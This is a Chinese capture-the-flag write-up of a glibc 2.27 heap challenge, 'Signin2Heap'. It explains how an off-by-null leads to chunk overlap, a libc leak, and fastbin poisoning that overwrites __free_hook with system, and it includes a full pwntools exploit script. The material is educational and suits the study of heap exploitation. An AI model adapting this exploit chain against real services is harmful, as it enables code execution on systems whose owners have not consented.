# Signin2Heap

## 题目简述

程序提供 `add`、`delete`、`show` 三个堆菜单，使用 glibc 2.27。输入函数存在 off-by-null：当一次写入恰好填满用户区时，结尾的空字节会落到相邻 chunk 的 `size` 最低字节。题目没有独立的 `edit`，因此必须通过“释放后重新申请”来布置 `prev_size`，再利用伪造的 `prev_inuse` 触发向后合并，制造仍可由菜单访问的重叠 chunk。

## 解题过程

### 1. off-by-null 如何变成堆重叠

PDF 只标出了 `Off by null`，没有附源码。公开选手题解补充了关键约束：单次申请不能超过 `0xff`，漏洞会在 `prev_size` 可复用时清零相邻 chunk 的 `prev_inuse` 位；这与官方 exp 的大小和释放顺序一致。下面只采用能由 exp 交叉验证的利用链，不补写未经证实的源码细节。

先申请三个相邻 chunk：

```text
chunk 0: request 0xf8 -> chunk size 0x100
chunk 1: request 0x68 -> chunk size 0x70
chunk 2: request 0xf8 -> chunk size 0x100
```

随后再申请并释放 7 个 `0xf8` chunk，填满 `0x100` 大小的 tcache。此时释放 chunk 0，它会进入 unsorted bin；释放 chunk 1 后，再以同样的 `0x68` 大小取回该位置，并写入：

```python
b"a" * 0x60 + p64(0x170)
```

其中 `0x170 = 0x100 + 0x70`，正好表示从 chunk 2 向前跨过 chunk 1 回到 chunk 0 的距离。紧随这 8 字节 `prev_size` 之后的 off-by-null 会把 chunk 2 的 `size` 低字节从 `0x01` 改为 `0x00`，等价于清除 `prev_inuse`。释放 chunk 2 时，glibc 因而按照伪造的 `prev_size` 向后合并，将 chunk 0、chunk 1、chunk 2 视为一整块空闲内存。

关键矛盾在于：程序的索引表仍认为 chunk 1 有效。于是 chunk 1 的菜单指针与合并后的空闲区重叠，形成 UAF/堆重叠原语。

### 2. 泄露 libc

从合并后的 unsorted chunk 中连续申请两个 `0x78` 请求，会切分该大块，并让 unsorted-bin 元数据落到旧 chunk 1 可见的位置。调用 `show(1)` 便能读出 `main_arena` 附近的指针。PDF 按随题提供的 glibc 2.27 符号计算：

```python
libc_base = (
    u64(io.recv(6).ljust(8, b"\x00"))
    - libc.sym["__malloc_hook"]
    - 0x10
    - 0x60
)
```

得到基址后即可定位 `__free_hook` 与 `system`。

### 3. fastbin poisoning 覆盖 `__free_hook`

第二阶段围绕 `0x70` 大小类操作：先用 7 个释放填满对应 tcache，再让后续释放进入 fastbin。由于旧 chunk 1 同时处于“程序认为已分配”和“堆管理器认为可释放”的重叠状态，释放序列可以构造 fastbin dup。清空 tcache 后，重新申请时把 fastbin 的 `fd` 改成 `__free_hook`，最终把 `system` 写到该位置。

另一个普通 chunk 写入 `/bin/sh\x00`。释放它时实际执行：

```c
__free_hook("/bin/sh") -> system("/bin/sh")
```

### 4. PDF exploit 完整转写

下列脚本只整理了缩进与异常换行，申请大小、索引、偏移及利用顺序均保持原 PDF 不变。比赛服务地址可能已经失效；复现时应切换到随题二进制与对应 `libc-2.27.so`。

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"

# io = process("./vuln")
io = remote("node1.hgame.vidar.club", 31308)

elf = ELF("./vuln")
libc = ELF("./libc-2.27.so")


def add(index, size, content):
    io.sendlineafter(b"Your choice:", p32(1))
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendafter(b"Content: ", content)


def delete(index):
    io.sendlineafter(b"Your choice:", p32(2))
    io.sendlineafter(b"Index: ", str(index).encode())


def show(index):
    io.sendlineafter(b"Your choice:", p32(3))
    io.sendlineafter(b"Index: ", str(index).encode())


add(0, 0xF8, b"a")
add(1, 0x68, b"a")
for i in range(2, 10):  # 2-9
    add(i, 0xF8, b"a")

add(12, 0x68, b"a")

for i in range(3, 10):  # 3-9，填满 0x100 tcache
    delete(i)

delete(0)
delete(1)
add(1, 0x68, b"a" * 0x60 + p64(0x170))
delete(2)

add(0, 0x78, b"a")
add(2, 0x78, b"a")
show(1)

libc_base = (
    u64(io.recv(6).ljust(8, b"\x00"))
    - libc.sym["__malloc_hook"]
    - 0x10
    - 0x60
)
log.success("libc_base={}".format(hex(libc_base)))

free_hook = libc_base + libc.sym["__free_hook"]
system = libc_base + libc.sym["system"]

add(3, 0x68, b"a")
for i in range(4, 11):
    add(i, 0x68, b"a")
for i in range(4, 11):
    delete(i)

delete(3)
delete(12)
delete(1)

for i in range(4, 11):
    add(i, 0x68, b"a")

add(1, 0x68, p64(free_hook))
add(3, 0x68, b"/bin/sh\x00")
add(13, 0x68, b"/bin/sh\x00")
add(12, 0x68, p64(system))
delete(3)

io.interactive()
```

原 PDF 没有记录最终 flag，当前目录也只有汇总 PDF、没有题目二进制和 glibc 附件，因此不能声称本地动态复现成功。漏洞细节与重叠过程可交叉参考公开选手题解 [HGAME 2025 Week 2 Writeup](https://summ2.link/categories/CTF/hgame-2025-week2-wp/)；该外链最重要的信息已经在本节前半部分完整概括。

## 方法总结

本题把一个单字节的 off-by-null 放大成完整利用链：伪造 `prev_size` 和 `prev_inuse`，触发向后合并制造重叠，用残留菜单指针泄露 unsorted-bin 地址，再通过 fastbin dup 把 `system` 写入 `__free_hook`。分析这类题时，不能只说“有 off-by-null”，还要同时证明写零落在哪个 chunk 字段、伪造距离为何是 `0x170`、哪一个应用层指针在合并后仍然可用，以及最终任意写由哪个 bin 的链表完成。
